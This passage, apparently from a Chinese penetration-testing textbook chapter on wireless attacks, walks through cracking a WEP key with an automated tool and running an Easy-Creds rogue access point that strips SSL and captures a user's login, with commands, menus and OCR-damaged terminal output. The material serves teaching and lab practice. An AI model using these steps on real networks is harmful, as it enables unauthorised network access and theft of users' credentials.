[+] scanning for wireless devices...
[+] enabling monitor mode on wlano... done
[+] initializing scan (monO), updates at 5 sec intervals, CTRL+C when ready
[0:0o:03] scanning wireless networks. 0 targets and 0 clients found
（2）停止扫描无线网络，将显示如下所示的信息：
NUM ESSID
CH ENCR POWER WPS? CLIENT
1
yzty
11
WPA2
59db
wps
client
2
Test
WEP
51db
wps
client
TP-LINK_D7118A
1
WPA2
35db
wps
CMCC-AUTO
1
WPA2
34db
no
5
CMCC-AUTO
1
WPA2
32db
no
client
6
CMCC-AUTO
11
WPA2
29db
no
TP-LINK_1C20FA
6
WPA2
28db
wps
8
CMCC-AUTO
11
WPA2
28db
no
6
CMCC-AUTO
6
WPA2
28db
no
10
CMCC-LIU
6
WPA2
28db
wps
11
TP-LINK_ZLICE
6
WPA2
27db
wps
12
CMCC-AUTO
6
WPA2
27db
no
client
13
Tenda_462950
4
WPA
26db
no
从以上信息中，可以看到扫描到13个无线接入点。
（3）选择攻击的目标。这里选择第二个无线接入点，它是使用WEP方式加密的。所
以，应该比较容易攻击，如下所示：
[+] select target numbers (1-13) separated by commas, or 'all: 2
[+] 1 target selected.
[0:10:00] preparing attack “Test (14:E6:E4:AC:FB:20)
[0:10:00] attempting fake authentication (5/5)..
failed
[0:10:00] attacking "Test” via arp-replay attack
[0:09:06] started cracking (over 10000 ivs)
[0:09:00] captured 12492 ivs @ 418 iv/sec
[0:09:00] cracked Test (14:E6:E4:AC:FB:20)!key:“6162636465"
[+]1attack completed:
· 292 ·
---
## Page 305
第9章无线网络渗透测试
[+] 1/1 WEP attacks succeeded
cracked Test (14:E6:E4:AC:FB:20),key:“6162636465
[+] disabling monitor mode on mono... done
[+]quitting
从以上输出信息中，可以看到攻击成功。其中，Test无线接入点的密码是6162636465。
9.5使用Easy-Creds工具攻击无线网络
Easy-Creds是一个菜单式的破解工具。该工具允许用户打开一个无线网卡，并能实现
一个无线接入点攻击平台。Easy-Creds可以创建一个欺骗访问点，并作为一个中间人攻击
类型运行，进而分析用户的数据流和账户信息。它可以从SSL加密数据中恢复账户。本节
将介绍使用Easy-Creds工具攻击无线网络。
Easy-Creds是BackTrack5中的一部分。在Kali中，默认没有安装该工具。所以，需要
先安装Easy-Creds工具才可使用。
【实例9-3】安装Easy-Creds工具。具体操作步骤如下所示。
（1）从https://github.com/bravOhax/easy-creds网站下载Easy-Creds软件包，其软件包名
为 easy-creds-master.zip。
（2）解压下载的软件包。执行命令如下所示：
X
LX
root@localhost:~# unzip easy-creds-master.zip
Archive:easy-creds-master.zip
bf9f00c08b1e26d8ff44ef27c7bcf59d3122ebcc
creating:easy-creds-master/
inflating: easy-creds-master/README
inflating: easy-creds-master/definitions.sslstrip
inflating: easy-creds-master/easy-creds.sh
inflating:easy-creds-masterinstaller.sh
从输出的信息中，可以看到Easy-Creds软件包被解压到easy-creds-master文件中。从
以上信息中，可以看到在easy-creds-master文件中有一个installer.sh文件，该文件就是用
来安装Easy-Creds软件包的。
（3）安装Easy-Creds软件包。在安装Easy-Creds软件包之前，有一些依赖包需要安装。
这些依赖包，可以参考casy-creds-master文件中的README文件安装相关的依赖包。然后，
安装Easy-Creds包。执行命令如下所示：
root@kali:~# cd easy-creds/
root@kali:~/easy-creds# ./installer.sh
I|e Illa IIls Ily II-IIl IIrIle IId Ils I
小小小小小小小小小
Version 3.7 - Garden of Your Mind
Installer
Please choose your OS to install easy-creds
1.Debian/Ubuntu and derivatives
2.Red Hat or Fedora
3.
Microsoft Windows
4.Exit
· 293 ·
---
## Page 306
第3篇各种渗透测试
Choice:
以上信息显示了，安装easy-creds的操作系统菜单。
（4）这里选择安装到Debian/Ubuntu，输入编号1，将显示如下所示的信息：
Choice:1
Ie Illa Is Ily III-IIlc IIIle Ild I|s I1
IMILIIMMIMI
小小小小小小小小小
Version 3.7 - Garden of Your Mind
Installer
Please provide the path you'd like to place the easy-creds folder. [/opt] :
#选择安装位置，本例中使用默认设置
[*] Installing pre-reqs for Debian/Ubuntu
[*] Running'updatedb'
[-] cmake is not installed, will attempt to install..
[+] cmake was successfully installed from the repository.
[+] 1 found gcc installed on your system
[+] 1 found g++ installed on your system
[+] 1 found subversion installed on your system
[+] 1 found wget installed on your system
[+] 1 found libssl-dev installed on your system
[+] 1 found libpcap0.8 installed on your system
[+] 1 found libpcap0.8-dev installed on your system
[+] 1 found libssl-dev installed on your system
[+] 1 found aircrack-ng installed on your system
[+] 1 found xterm installed on your system
[+] 1 found sslstrip installed on your system
[+] 1 found ettercap installed on your system
[+] 1 found hamster installed on your system
[-] ferret is not installed, will attempt to install..
[*] Downloading and installing ferret from SVN
[*] Installing the patched freeradius server...
make[4]: Leaving directory /tmp/ec-instal/freeradius-server-2.1.11/doc/rfc
make[3]: Leaving directory */tmp/ec-instal/freeradius-server-2.1.11/doc
make[2]: Leaving directory */tmp/ec-install/freeradius-server-2.1.11/doc
make[1]: Leaving directory /tmp/ec-install/freeradius-server-2.1.11
[+] The patched freeradius server has been installed
[+] 1 found asleap installed on your system
[+] 1 found metasploit installed on your system
[*] Running 'updatedb' again because we installed some new stuff
...happy hunting!
以上信息显示了安装Easy-Creds包的详细过程。在该过程中，会检测easy-creds的依
赖包是否都已安装。如果没有安装，此过程中会安装。Easy-Creds软件包安装完成后，将
显示happyhunting！信息。
【实例9-4】使用Easy-Creds工具破解无线网络。具体操作步骤如下所示。
（1）启动Easy-Creds工具。执行命令如下所示：
root@localhost:~/easy-creds-master#./easy-creds.sh
Ie Illa IIls Ily II-1Il IIle Id I/s I
小小小小小小小小小
Version 3.8-dev - Garden of New Jersey
· 294 ·
---
## Page 307
第9章无线网络渗透测试
At any time,ctrl+c to cancel and retum to the main menu
1.
Prerequisites & Configurations
Poisoning Attacks
3.
FakeAP Attacks
4.Data Review
5.Exit
Quit current poisoning session
Choice:
以上输出的信息显示了Easy-Creds工具的攻击菜单。
（2）这里选择伪AP攻击，输入编号3。将显示如下所示的信息：
Choice:3
IeIlla Is Ily III-IIlcIIIle Ild Is I
小小小小小小小小小
Version 3.8-dev - Garden of New Jersey
At any time, ctrl+c to cancel and retum to the main menu
7
FakeAP Attack Static
2.
FakeAP Attack EvilTwin
3.
Karmetasploit Attack
FreeRadius Attack
5.
DoS AP Options
6.Previous Menu
Choice:
以上输出信息显示了伪AP攻击可使用的方法。
（3）这里选择使用静态伪AP攻击，输入编号H将显示如下所示的信息：
Choice:1
I|e Illa IIls Ily II-IIl IIrIle IId IIls I
V_W_W_W_W_W_W_W_W_W_V
Version 3.8-dev - Garden of New Jersey
At any time, ctrl+c to cancel and retum to the main menu
Would you like to include a sidejacking attack? [y/N]: N
#是否想要包括劫持攻击
Network Interfaces:
etho
00:0c:29:5f:34:4b
IP:192.168.0.117
wlano
00:c1:40:76:05:6c
Interface connected to the internet (ex. etho): eth0
#选择要连接的接口
Interface Chipset
Driver
wlano
Ralink RT2870/3070 rt2800usb - [phy0]
Wireless interface name (ex. wlano): wlan0
#设置无线接口名
ESSID you would like your rogue AP to be called, example FreeWiFi: wlan
#设置无线AP的ESSID
Channel you would like to broadcast on: 4
#设置使用的信道
[▪] Your interface has now been placed in Monitor Mode
mono
Ralink RT2870/3070rt2800usb-[phy0]
Enter your monitor enabled interface name, (ex: mono): mon0
#设置监听模式接口名
Would you like to change your MAC address on the mon interface? [y/N]: N
#是否修改监听接口的MAC地址
Enter your tunnel interface, example at0: ato
#设置隧道接口
Do you have a dhcpd.conf file to use? [y/N]: N
#是否使用dhcpd.conf文件
Network range for your tunneled interface, example 10.0.0.0/24: 10.0.0.0/24
#设置隧道接口的网络范围
· 295 ·
---
## Page 308
第3篇各种渗透测试
The following DNS server IPs were found in your /etc/resolv.conf file:
<> 192.168.0.1
Enter the IP address for the DNS server, example 8.8.8.8: 192.168.0.1
#设置DNS服务器
[] Creating a dhcpd.conf to assign addresses to clients that connect to us.
[] Launching Airbase with your settings.
[+] Configuring tunneled interface.
[] Setting up iptables to handle traffic seen by the tunneled interface.
[] Launching Tail.
[*] DHCP server starting on tunneled interface.
[ok] Starting ISC DHCP server: dhcpd
[*] Launching SSLStrip..
[] Launching ettercap. poisoning specified hosts.
[] Configuring IP forwarding...
[*] Launching URLSnarf...
[*] Launching Dsni...
设置完以上的信息后，将会自动启动一些程序。几秒后，将会打开几个有效窗口，如
图9.34所示。
Airbase-NG
-口x
Cstarted
 oet pie
degnestrfnist aled on oreuest after its cormection sas lost:s use Rep
d/ebetp,pi*lane06. in finih
Ettercap - [tunnel]
[4::9:F]0EST12.10,4,10
HCP
REOUEST 10,0,0,103
USER：testlive.comPG5:qrt
4.
m12sctn
图9.34有效的窗口
（4）当有用户连接Wifi接入点时，Easy-Creds将自动给客户端分配一个IP地址，并
且能够访问互联网。如果在互联网上访问一个安全网址时，该工具将除去SSL并删除安全
连接并在后台运行。所以，能够读取到客户端登录某个网站的用户名和密码。如图9.34所
示，捕获到一个登录http://www.live.com网站的用户名和密码。其用户名为PI:EMAIL，
· 296 ·
---
## Page 309
第9章无线网络渗透测试
密码为qwert。
（5）此时在Easy-Creds的主菜单中选择数据恢复，输入编号4，如下所示：
At any time, ctrl+cto cancel and retum to the main menu
1.
Prerequisites & Configurations
Poisoning Attacks
3.
FakeAP Attacks
Data Review
5.Exit
Quit current poisoning session
Choice:4
（6）选择数据恢复后，将显示如下所示的信息：
leIllaIsIlyI-IlcIrIleIdIs|
V_W_W_W_W_W_W_W_W_W_V
Version 3.8-dev - Garden of New Jersey
At any time, ctrl+cto cancel and retum to the main menu
1.F
Parse SSLStrip log for credentials
2.
Parse dsniff file for credentials
3.
Parse ettercap eci file for credentials
Parse freeradius attack file for credentials
5.Previous Menu
Choice:3
以上信息显示了可用证书的方法。
（7）这里选择分析Ettercapeci文件，输入编号3六将显示如下所示的信息：
Ile Illa Ils Illy II-IIc IIrIle Id Ils I
小小小小小小小小
Version 3.8-dev - Garden of New Jersey
At any time, ctrl+c to cancel and return to the main menu
Ettercap logs in current log folder:
/root/easy-creds-master/easy-creds-2014-07-24-1722/ettercap2014-07-24-1724.eci
Enter the full path to your ettercap.eci log file:
从输出信息中，可以看到Ettercap日志文件的保存位置。
（8）此时输入ettercap.eci日志文件的全路径。这里只需要通过复制并粘贴提供的整个
Ettercap路径就可以了。如下所示：
Enter
thefullpathtoyour
ettercap.eci
log
file:/root/easy-creds-master/
easy-creds-2014-07-24-1722/ettercap2014-07-24-1724.eci
输入以下路径后，将显示如图9.35所示的界面。
Ettercap Accounts
etterlog MC-0,7,4,2 copyr ight 20012005 FLo s NsCA
131.253,61.9610P00
图9.35恢复的数据
· 297 ·
---
## Page 310